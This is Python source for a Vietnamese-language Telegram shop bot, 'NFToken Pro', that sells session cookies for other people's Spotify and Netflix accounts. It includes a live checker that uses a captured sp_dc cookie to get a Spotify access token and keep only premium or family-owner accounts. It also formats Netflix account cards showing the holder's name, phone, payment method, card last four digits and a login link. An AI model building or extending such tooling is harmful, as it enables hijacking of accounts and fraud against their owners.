import logging
import os
import requests
import json
import re
import zipfile
import rarfile
import io
import time
import asyncio
import random
import sqlite3
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, MenuButtonWebApp
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from urllib.parse import quote

APP_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE_PATH = os.getenv('BOT_DATABASE_PATH', os.path.join(APP_DIR, 'bot_database.db'))
TOKEN_FILE = os.path.join(APP_DIR, 'tokenbot.txt')
ADMIN_ID = int(os.getenv('TELEGRAM_ADMIN_ID', '5992662564'))
MINIAPP_URL = os.getenv('TELEGRAM_MINIAPP_URL', '').strip()

def get_connection():
    return sqlite3.connect(DATABASE_PATH, timeout=30, check_same_thread=False)

def init_db():
    conn = get_connection()
    c = conn.cursor()
    c.execute('PRAGMA journal_mode=WAL')
    c.execute('PRAGMA busy_timeout=30000')
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 0,
                  credits INTEGER DEFAULT 0, plan_name TEXT DEFAULT 'FREE', is_banned INTEGER DEFAULT 0,
                  last_active TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS plans
                 (name TEXT PRIMARY KEY, tokens_max INTEGER, cookies_max INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, is_used INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS free_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, is_used INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS store
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price INTEGER, credits INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS discount_codes
                 (code TEXT PRIMARY KEY, amount INTEGER, uses INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, status TEXT DEFAULT 'PENDING')''')
    c.execute('''CREATE TABLE IF NOT EXISTS usage
                 (user_id INTEGER, date TEXT, tokens_used INTEGER DEFAULT 0, free_cookies_used INTEGER DEFAULT 0,
                  PRIMARY KEY(user_id, date))''')
    c.execute('''CREATE TABLE IF NOT EXISTS purchase_history
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, plan_name TEXT, price INTEGER, date TEXT)''')
    c.execute('''INSERT OR IGNORE INTO plans (name, tokens_max, cookies_max) VALUES ('FREE', 0, 0)''')

    c.execute('''CREATE TABLE IF NOT EXISTS spotify_cookies
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  json_data TEXT,
                  email TEXT,
                  country TEXT,
                  plan_type TEXT,
                  is_used INTEGER DEFAULT 0)''')

    conn.commit()
    conn.close()

def process_spotify_cookie_text(text):
    """
    Phân tích file text Spotify để lấy Email, Country và chuyển Netscape sang JSON.
    Không dựa vào Plan trong text nữa vì sẽ dùng LIVE CHECK qua API.
    """
    email_match = re.search(r'[-–]\s*Email:\s*([^\n\r]+)', text)
    email = email_match.group(1).strip() if email_match else "Unknown"

    country_match = re.search(r'[-–]\s*Country:\s*([^\n\r]+)', text)
    country = country_match.group(1).strip() if country_match else "XX"

    lines = text.split('\n')
    json_cookies = []
    for line in lines:
        if line.startswith('#') or not line.strip():
            continue
        parts = line.strip().split('\t')
        if len(parts) < 7:
            parts = re.split(r'\s+', line.strip(), maxsplit=6)
        if len(parts) >= 7:
            try:
                expiry_str = parts[4].strip()
                try:
                    expiry = float(expiry_str)
                except ValueError:
                    expiry = 253402300799

                # Note: if expiry_str is empty string or non-numeric, .isdigit() returns False, 
                # so session field evaluates to False in the else branch - this is OK.
                session_val = (expiry == 0) if expiry_str.replace('.','',1).isdigit() else False

                cookie_dict = {
                    "domain": parts[0],
                    "expirationDate": expiry,
                    "hostOnly": not parts[0].startswith('.'),
                    "httpOnly": False,
                    "name": parts[5],
                    "path": parts[2],
                    "sameSite": "unspecified",
                    "secure": parts[3].upper() == 'TRUE',
                    "session": session_val,
                    "storeId": "0",
                    "value": parts[6]
                }
                json_cookies.append(cookie_dict)
            except Exception:
                continue

    if not json_cookies:
        return None

    return {
        "email": email,
        "country": country,
        "json_data": json.dumps(json_cookies, indent=4)
    }

async def check_spotify_cookie_live(json_cookies):
    """
    KIỂM TRA SỐNG/CHẾT VÀ GÓI SPOTIFY TRỰC TIẾP QUA API.
    Trả về: (is_live: bool, plan_type: str) -> plan_type có thể là 'PREMIUM' hoặc 'FAMILY_OWNER'
    """
    sp_dc = next((c['value'] for c in json_cookies if c['name'] == 'sp_dc'), None)
    if not sp_dc:
        return False, None

    def fetch():
        try:
            cookies = {'sp_dc': sp_dc}
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

            r = requests.get('https://open.spotify.com/get_access_token?reason=transport&productType=web_player', cookies=cookies, headers=headers, timeout=15)
            if r.status_code != 200:
                return False, None

            token = r.json().get('accessToken')
            if not token:
                return False, None

            auth_headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }

            r_me = requests.get('https://api.spotify.com/v1/me', headers=auth_headers, timeout=10)
            if r_me.status_code != 200:
                return False, None

            me_data = r_me.json()
            if me_data.get('product') != 'premium':
                return False, None  # Nếu là gói FREE -> Vứt

            actual_plan = 'PREMIUM'
            try:
                r_fam = requests.get('https://spclient.wg.spotify.com/family/v1/family/home', headers=auth_headers, timeout=10)

                if r_fam.status_code == 200:
                    fam_data = r_fam.json()
                    role = fam_data.get('customRole', fam_data.get('role', '')).upper()
                    if role == 'MASTER' or fam_data.get('isMaster') == True:
                        actual_plan = 'FAMILY_OWNER'
            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

            return True, actual_plan
        except Exception as e:
            return False, None

    return await asyncio.to_thread(fetch)

def get_spotify_cookie_from_db(plan_type):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, json_data, email, country FROM spotify_cookies WHERE is_used=0 AND plan_type=? LIMIT 1", (plan_type,))
    res = c.fetchone()
    if res:
        c.execute("UPDATE spotify_cookies SET is_used=1 WHERE id=?", (res[0],))
        conn.commit()
    conn.close()
    return res

def get_spotify_cookie_count(plan_type=None):
    conn = get_connection()
    c = conn.cursor()
    if plan_type:
        c.execute("SELECT COUNT(*) FROM spotify_cookies WHERE is_used=0 AND plan_type=?", (plan_type,))
    else:
        c.execute("SELECT COUNT(*) FROM spotify_cookies WHERE is_used=0")
    res = c.fetchone()[0]
    conn.close()
    return res

def is_user_banned(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    conn.close()
    return res[0] == 1 if res else False

def ban_user(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def get_user(user_id, username):
    conn = get_connection()
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    if not res:
        c.execute("INSERT INTO users (user_id, username, last_active) VALUES (?, ?, ?)", (user_id, username, now))
    else:
        c.execute("UPDATE users SET username=?, last_active=? WHERE user_id=?", (username, now, user_id))
    conn.commit()
    conn.close()
    return res

def get_user_economy(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT balance, credits FROM users WHERE user_id=?", (user_id,))
    res = c.fetchone()
    conn.close()
    return res if res else (0, 0)

def get_user_quota(user_id):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT plan_name FROM users WHERE user_id=?", (user_id,))
    plan_res = c.fetchone()
    plan_name = plan_res[0] if plan_res else 'FREE'

    c.execute("SELECT tokens_max, cookies_max FROM plans WHERE name=?", (plan_name,))
    p_res = c.fetchone()
    tokens_max, cookies_max = p_res if p_res else (0, 0)

    c.execute("SELECT tokens_used, free_cookies_used FROM usage WHERE user_id=? AND date=?", (user_id, date))
    u_res = c.fetchone()
    if not u_res:
        c.execute("INSERT INTO usage (user_id, date) VALUES (?, ?)", (user_id, date))
        conn.commit()
        tokens_used, free_cookies_used = 0, 0
    else:
        tokens_used, free_cookies_used = u_res
    conn.close()
    return tokens_used, tokens_max, free_cookies_used, cookies_max, plan_name

def claim_free_cookie(user_id):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT id, data FROM free_cookies WHERE is_used=0 LIMIT 1")
    cookie = c.fetchone()
    if cookie:
        c.execute("UPDATE free_cookies SET is_used=1 WHERE id=?", (cookie[0],))
        c.execute("UPDATE usage SET free_cookies_used = free_cookies_used + 1 WHERE user_id=? AND date=?", (user_id, date))
        conn.commit()
        conn.close()
        return cookie[1]
    conn.close()
    return None

def get_stats():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE date(last_active) = date('now')")
    active = c.fetchone()[0]
    c.execute("SELECT SUM(tokens_used) FROM usage")
    tokens = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=0")
    avail = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=1")
    used = c.fetchone()[0]
    conn.close()
    return total, active, tokens, avail, used

def set_plan(user_id, plan_name):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT name FROM plans WHERE name=?", (plan_name,))
    if not c.fetchone():
        c.execute("INSERT INTO plans (name, tokens_max, cookies_max) VALUES (?, 9999, 9999)", (plan_name,))

    c.execute("UPDATE users SET plan_name=? WHERE user_id=?", (plan_name, user_id))
    conn.commit()
    conn.close()
    return True

def add_plan(name, tokens_max, cookies_max):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO plans (name, tokens_max, cookies_max) VALUES (?, ?, ?)", (name, tokens_max, cookies_max))
    conn.commit()
    conn.close()

def add_free_cookie(cookie):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO free_cookies (data) VALUES (?)", (cookie,))
    conn.commit()
    conn.close()

def use_discount_code(code, user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT amount, uses FROM discount_codes WHERE code=?", (code,))
    res = c.fetchone()
    if res and res[1] > 0:
        c.execute("UPDATE discount_codes SET uses = uses - 1 WHERE code=?", (code,))
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (res[0], user_id))
        conn.commit()
        conn.close()
        return True, res[0]
    conn.close()
    return False, "Mã không hợp lệ hoặc đã hết lượt sử dụng."

def get_store_items():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, name, price, credits FROM store")
    res = c.fetchall()
    conn.close()
    return res

def get_store_item(item_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, name, price, credits FROM store WHERE id=?", (item_id,))
    res = c.fetchone()
    conn.close()
    return res

def deduct_balance(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
    bal = c.fetchone()[0]
    if bal >= amount:
        c.execute("UPDATE users SET balance = balance - ? WHERE user_id=?", (amount, user_id))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def add_credits(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def deduct_credits(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def add_purchase_history(user_id, plan_name, price):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO purchase_history (user_id, plan_name, price, date) VALUES (?, ?, ?, ?)", (user_id, plan_name, price, date))
    tx_id = c.lastrowid
    conn.commit()
    conn.close()
    return tx_id

def get_purchase_history(user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT plan_name, price, date FROM purchase_history WHERE user_id=? ORDER BY id DESC", (user_id,))
    res = c.fetchall()
    conn.close()
    return res

def get_purchase_by_id(purchase_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, user_id, plan_name, price, date FROM purchase_history WHERE id=?", (purchase_id,))
    res = c.fetchone()
    conn.close()
    return res

def create_transaction(user_id, amount):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO transactions (user_id, amount) VALUES (?, ?)", (user_id, amount))
    tx_id = c.lastrowid
    conn.commit()
    conn.close()
    return tx_id

def approve_transaction(tx_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, amount, status FROM transactions WHERE id=?", (tx_id,))
    res = c.fetchone()
    if res and res[2] == 'PENDING':
        c.execute("UPDATE transactions SET status='APPROVED' WHERE id=?", (tx_id,))
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (res[1], res[0]))
        conn.commit()
        conn.close()
        return True, res[0], res[1]
    conn.close()
    return False, None, None

def reject_transaction(tx_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id FROM transactions WHERE id=?", (tx_id,))
    res = c.fetchone()
    uid = res[0] if res else None
    c.execute("UPDATE transactions SET status='REJECTED' WHERE id=?", (tx_id,))
    conn.commit()
    conn.close()
    return uid

def add_store_item(name, price, credits):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT INTO store (name, price, credits) VALUES (?, ?, ?)", (name, price, credits))
    conn.commit()
    conn.close()

def delete_store_item(item_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM store WHERE id=?", (item_id,))
    conn.commit()
    conn.close()

def get_premium_cookie_count():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM premium_cookies WHERE is_used=0")
    res = c.fetchone()[0]
    conn.close()
    return res

def get_all_premium_cookies():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, data FROM premium_cookies WHERE is_used=0")
    res = c.fetchall()
    conn.close()
    return res

def pop_premium_cookies(count, user_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT id, data FROM premium_cookies WHERE is_used=0 ORDER BY RANDOM() LIMIT ?", (count,))
    cookies = c.fetchall()
    for cookie in cookies:
        c.execute("UPDATE premium_cookies SET is_used=1 WHERE id=?", (cookie[0],))
    conn.commit()
    conn.close()
    return cookies

def return_premium_cookie(c_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("UPDATE premium_cookies SET is_used=0 WHERE id=?", (c_id,))
    conn.commit()
    conn.close()

def delete_premium_cookie(c_id):
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM premium_cookies WHERE id=?", (c_id,))
    conn.commit()
    conn.close()

def purge_all_premium_cookies():
    conn = get_connection()
    c = conn.cursor()
    c.execute("DELETE FROM premium_cookies")
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted

def add_token_usage(user_id, count):
    conn = get_connection()
    c = conn.cursor()
    date = datetime.now().strftime('%Y-%m-%d')
    c.execute("UPDATE usage SET tokens_used = tokens_used + ? WHERE user_id=? AND date=?", (count, user_id, date))
    conn.commit()
    conn.close()

def add_discount_code(code, amount, uses):
    conn = get_connection()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO discount_codes (code, amount, uses) VALUES (?, ?, ?)", (code, amount, uses))
    conn.commit()
    conn.close()

def get_all_users():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, username, plan_name, is_banned FROM users ORDER BY last_active DESC")
    res = c.fetchall()
    conn.close()
    return res

def get_banned_users():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_banned=1")
    res = c.fetchall()
    conn.close()
    return res

def load_bot_token() -> str:
    """Load credentials without committing a Telegram token to source control."""
    token = os.getenv('TELEGRAM_BOT_TOKEN', '').strip()
    if token:
        return token
    try:
        with open(TOKEN_FILE, 'r', encoding='utf-8') as handle:
            return next((line.strip() for line in handle
                         if line.strip() and not line.lstrip().startswith('#')), '')
    except OSError:
        return ''


def configure_bot_token() -> str:
    """Get and persist the token on first interactive Termux launch."""
    token = load_bot_token()
    if token:
        return token
    if not os.isatty(0):
        raise RuntimeError(
            "Thiếu token bot. Chạy trực tiếp `python code_goc.py` để nhập "
            "token, hoặc đặt biến TELEGRAM_BOT_TOKEN."
        )

    print("\n=== CẤU HÌNH BOT LẦN ĐẦU ===", flush=True)
    print("Lấy token tại @BotFather, dán vào rồi nhấn Enter.", flush=True)
    token = input("Token bot (sẽ hiện trên màn hình): ").strip()
    if not re.fullmatch(r'\d{6,12}:[A-Za-z0-9_-]{20,}', token):
        raise RuntimeError("Token không đúng định dạng BotFather.")
    with open(TOKEN_FILE, 'w', encoding='utf-8') as handle:
        handle.write(token + '\n')
    try:
        os.chmod(TOKEN_FILE, 0o600)
    except OSError:
        logger.warning("Không thể giới hạn quyền đọc file token %s", TOKEN_FILE)
    print(f"Đã lưu token an toàn tại: {TOKEN_FILE}\n")
    return token


MAX_FILE_SIZE = 20 * 1024 * 1024
MAX_BATCH_COOKIES = 99999
MAX_ZIP_ENTRIES = 1000
MAX_ZIP_UNCOMPRESSED_SIZE = 100 * 1024 * 1024
MAX_RETRIES = 3
RETRY_BACKOFF = 1
REQUEST_TIMEOUT = 30
BOT_VERSION = "4.5 PRO ULTRA"
BOT_NAME = "NFToken Pro"

COUNTRY_NAMES_VI = {
    'VN': 'Việt Nam', 'US': 'Hoa Kỳ', 'GB': 'Vương quốc Anh',
    'TH': 'Thái Lan', 'CA': 'Canada', 'AU': 'Úc', 'JP': 'Nhật Bản',
    'KR': 'Hàn Quốc', 'IN': 'Ấn Độ', 'BR': 'Brazil', 'MX': 'Mexico',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia',
    'SG': 'Singapore', 'TW': 'Đài Loan', 'HK': 'Hồng Kông',
    'DE': 'Đức', 'FR': 'Pháp', 'IT': 'Ý', 'ES': 'Tây Ban Nha',
    'NL': 'Hà Lan', 'TR': 'Thổ Nhĩ Kỳ', 'AR': 'Argentina',
}


def country_display_name(value: str) -> str:
    """Always make an ISO country value understandable to Vietnamese users."""
    code = str(value or '').strip().upper()
    if not code or code in {'N/A', 'XX', 'UNKNOWN'}:
        return 'Không xác định'
    name = COUNTRY_NAMES_VI.get(code)
    return f"{name} ({code})" if name else code


def validate_zip_archive(archive: zipfile.ZipFile) -> None:
    """Reject zip bombs, path traversal and unexpectedly large archives."""
    entries = archive.infolist()
    if len(entries) > MAX_ZIP_ENTRIES:
        raise ValueError(f"ZIP có quá nhiều file (tối đa {MAX_ZIP_ENTRIES})")
    if sum(item.file_size for item in entries) > MAX_ZIP_UNCOMPRESSED_SIZE:
        raise ValueError("Dung lượng giải nén của ZIP vượt giới hạn an toàn")
    for item in entries:
        normalized = item.filename.replace('\\', '/')
        if normalized.startswith('/') or '..' in normalized.split('/'):
            raise ValueError("ZIP chứa đường dẫn không an toàn")

def validate_rar_archive(archive) -> None:
    """Reject rar bombs, path traversal and unexpectedly large archives."""
    entries = archive.infolist()
    if len(entries) > MAX_ZIP_ENTRIES:
        raise ValueError(f"RAR có quá nhiều file (tối đa {MAX_ZIP_ENTRIES})")
    if sum(item.file_size for item in entries) > MAX_ZIP_UNCOMPRESSED_SIZE:
        raise ValueError("Dung lượng giải nén của RAR vượt giới hạn an toàn")
    for item in entries:
        normalized = item.filename.replace('\\', '/')
        if normalized.startswith('/') or '..' in normalized.split('/'):
            raise ValueError("RAR chứa đường dẫn không an toàn")

MAINTENANCE_MODE = False
SPAM_TRACKER = {}
SPAM_LIMIT = 6
SPAM_WINDOW = 5
SPAM_COOLDOWN = 20

async def check_user_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user: return False
    user_id = user.id

    global MAINTENANCE_MODE
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        msg = update.message or (update.callback_query.message if update.callback_query else None)
        if msg:
            await msg.reply_text("🛠 *Hệ thống đang bảo trì!*\nVui lòng quay lại sau nhé.", parse_mode='Markdown')
        return False

    if is_user_banned(user_id):
        msg = update.message or (update.callback_query.message if update.callback_query else None)
        if msg:
            await msg.reply_text("🚫 *Tài khoản của bạn đã bị KHÓA!*\nVui lòng liên hệ Admin để được hỗ trợ.", parse_mode='Markdown')
        return False

    if user_id != ADMIN_ID:
        now = time.time()
        state = SPAM_TRACKER.get(user_id, {'timestamps': [], 'blocked_until': 0})
        if now < state['blocked_until']:
            return False
        timestamps = state['timestamps']
        timestamps = [ts for ts in timestamps if now - ts < SPAM_WINDOW]
        timestamps.append(now)
        state['timestamps'] = timestamps
        SPAM_TRACKER[user_id] = state

        if len(timestamps) > SPAM_LIMIT:
            state['timestamps'] = []
            state['blocked_until'] = now + SPAM_COOLDOWN
            msg = update.message or (update.callback_query.message if update.callback_query else None)
            if msg:
                await msg.reply_text(
                    f"⏳ Bạn thao tác quá nhanh. Vui lòng chờ {SPAM_COOLDOWN} giây.")
            logger.warning("Rate limited Telegram user %s", user_id)
            return False

    return True

LOGO = "◆ 𝗡𝗙𝗧𝗼𝗸𝗲𝗻 𝗣𝗿𝗼"
DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
DIVIDER_THIN = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
FOOTER = f"⚡ {BOT_NAME} v{BOT_VERSION}"

def banner_main(user_id: int, user_name: str, balance: int, credits: int) -> str:
    return (
        f"👋 Chào mừng *{user_name}*,\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID của bạn: `{user_id}`\n"
        f"💰 Số dư: `{balance:,.0f}đ`\n"
        f"💎 Lượt Rút Cookie VIP: `{credits}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👇 Chọn chức năng bên dưới 👇\n"
    )

def banner_result_fail() -> str: return f"◈━━━ ❌ 𝗧𝗛𝗔̂́𝗧 𝗕𝗔̣𝗜 ━━━◈\n"

def banner_batch_done(ok: int, total: int) -> str:
    pct = round(ok / total * 100) if total > 0 else 0
    bar_filled = round(pct / 10)
    bar_empty = 10 - bar_filled
    bar = "█" * bar_filled + "░" * bar_empty
    return (
        f"◈━━━ 📊 𝗞𝗘̂́𝗧 𝗤𝗨𝗔̉ ━━━◈\n\n"
        f"  {bar}  {pct}%\n\n"
        f"  ✅ Thành công:  *{ok}*\n"
        f"  ❌ Thất bại:      *{total - ok}*\n"
        f"  📁 Tổng cộng:   *{total}*\n\n"
        f"  {DIVIDER_THIN}\n"
        f"  {FOOTER}"
    )

def progress_bar(current: int, total: int, ok: int) -> str:
    pct = round(current / total * 100) if total > 0 else 0
    bar_filled = round(pct / 5)
    bar_empty = 20 - bar_filled
    bar = "▓" * bar_filled + "░" * bar_empty
    return (
        f"⏳ *Đang xử lý...*\n\n"
        f"  `[{bar}]` {pct}%\n\n"
        f"  📋 Tiến độ: *{current}* / *{total}*\n"
        f"  ✅ Hoạt động: *{ok}*"
    )

def format_account_card(account: dict, link: str, index: int = 0) -> str:
    def normalize_display(value):
        if isinstance(value, str):
            text = value.strip()
            try:
                text = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), text)
                text = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), text)
                text = text.encode('utf-16', 'surrogatepass').decode('utf-16')
            except Exception: pass
            import html as html_mod
            text = html_mod.unescape(text)
            return repair_mojibake(text)
        if isinstance(value, bool): return 'Có' if value else 'Không'
        if isinstance(value, (int, float)): return str(value)
        if isinstance(value, dict):
            for key in ['value', 'formattedPrice', 'displayValue', 'text', 'label', 'name', 'title', 'localizedName', 'price']:
                if key in value:
                    normalized = normalize_display(value[key])
                    if normalized: return normalized
            if len(value) == 1: return normalize_display(next(iter(value.values())))
            items = [normalize_display(v) for v in value.values() if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        if isinstance(value, list):
            items = [normalize_display(v) for v in value if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        return 'N/A'

    account_name = escape_telegram_markdown(repair_mojibake(normalize_display(account.get('account_name', 'N/A'))))
    email_masked = normalize_display(account.get('email_masked', 'N/A'))
    phone = normalize_display(account.get('phone', 'N/A'))
    country = normalize_display(account.get('country', 'N/A'))
    currency = normalize_display(account.get('country_currency', ''))
    status = normalize_display(account.get('membership_status', 'N/A'))
    plan = normalize_display(account.get('plan', 'N/A'))
    plan_price = normalize_display(account.get('plan_price', 'N/A'))
    member_since = normalize_display(account.get('member_since', 'N/A'))
    next_billing = normalize_display(account.get('next_billing', 'N/A'))
    payment_method = normalize_display(account.get('payment_method', 'N/A'))
    cc_type = normalize_display(account.get('cc_type', 'N/A'))
    last4 = normalize_display(account.get('last4', 'N/A'))
    payment_on_hold = normalize_display(account.get('payment_on_hold', 'N/A'))
    video_quality = normalize_display(account.get('video_quality', 'N/A'))
    extra_member = normalize_display(account.get('extra_member', 'N/A'))
    profile_count = normalize_display(account.get('profile_count', 'N/A'))
    profiles = [normalize_display(p) for p in account.get('profiles', []) if normalize_display(p)]

    def known_or(value: str, fallback: str = 'Không xác định') -> str:
        return fallback if str(value).strip().casefold() in {
            '', 'n/a', 'na', 'none', 'null', 'unknown', 'xx'
        } else value

    status = known_or(status)
    plan = known_or(plan, 'Không lấy được từ Netflix')
    member_since = known_or(member_since, 'Netflix không cung cấp')
    next_billing = known_or(next_billing, 'Netflix không cung cấp')
    payment_method = known_or(payment_method, 'Không xác định')
    payment_on_hold = known_or(payment_on_hold, 'Không xác định')
    video_quality = known_or(video_quality, 'Không xác định')
    extra_member = known_or(extra_member, 'Không xác định')
    profile_count = known_or(profile_count, str(len(profiles)) if profiles else '0')

    status_map = {'CURRENT_MEMBER': 'Đang hoạt động', 'FORMER_MEMBER': 'Đã hết hạn', 'ON HOLD': 'Tạm dừng'}
    status_vn = status_map.get(status, status)

    if phone == 'N/A': phone = 'Chưa thiết lập'
    if cc_type == 'N/A' and payment_method != 'N/A':
        pm_lower = payment_method.lower()
        cc_type_map = {
            'cc': 'Credit Card', 'credit_card': 'Credit Card', 'creditcard': 'Credit Card', 'dcb': 'Nhà mạng (DCB)',
            'paypal': 'PayPal', 'gift': 'Gift Card', 'giftcard': 'Gift Card', 'mobilewallet': 'Ví điện tử',
            'itunes': 'iTunes', 'applepay': 'Apple Pay', 'googleplay': 'Google Play', 'googlepay': 'Google Pay',
        }
        cc_type = cc_type_map.get(pm_lower, payment_method)
    elif cc_type == 'N/A': cc_type = 'Không rõ'
    non_card_types = ('mobilewallet', 'dcb', 'paypal', 'gift', 'giftcard', 'itunes', 'applepay', 'googleplay', 'googlepay')
    if last4 == 'N/A':
        if payment_method != 'N/A' and payment_method.lower() in non_card_types: last4 = 'Không có'
        else: last4 = 'Ẩn'
    if account_name == 'N/A': account_name = 'Không rõ'
    if email_masked == 'N/A': email_masked = 'Không rõ'

    profiles_str = ', '.join(profiles) if profiles else 'Không có'
    country_name = country_display_name(country)
    country_display = f"{country_name} · tiền tệ {currency}" if currency else country_name

    if plan_price != 'N/A':
        has_currency = any(c in plan_price for c in '$€£¥₩฿₫₹₱₺₦₪') or any(plan_price.upper().startswith(p) for p in ['THB', 'VND', 'USD', 'EUR', 'GBP', 'ARS', 'CLP', 'COP', 'PEN', 'AED', 'SAR', 'R$', 'C$', 'A$', 'S$', 'HK$', 'NT$', 'RM', 'Rp'])
        price_display = plan_price if has_currency else (f"{currency} {plan_price}" if currency else plan_price)
    else: price_display = 'Không rõ'

    return (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"THÔNG TIN TÀI KHOẢN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Tên: {account_name}\n"
        f"├ Email: `{email_masked}`\n"
        f"├ Số điện thoại: `{phone}`\n"
        f"├ Quốc gia: {country_display}\n"
        f"└ Trạng thái: {status_vn}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"GÓI CƯỚC & THANH TOÁN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Gói cước: {plan}\n"
        f"├ Giá: {price_display}\n"
        f"├ Thành viên từ: {member_since}\n"
        f"├ Hóa đơn tiếp theo: {next_billing}\n"
        f"├ Phương thức TT: {payment_method}\n"
        f"├ Loại thẻ: {cc_type}\n"
        f"├ 4 số cuối: {last4}\n"
        f"└ Tạm giữ thanh toán: {payment_on_hold}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"CHI TIẾT DỊCH VỤ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Chất lượng video: {video_quality}\n"
        f"├ Extra Member: {extra_member}\n"
        f"├ Số Profile: {profile_count}\n"
        f"└ Profiles: {profiles_str}\n\n"
        f"🔗 **Link Đăng Nhập:**\n`{link}`\n\n"
        f"Nếu có lỗi xảy ra, hãy bấm nút Báo lỗi bên dưới:"
    )

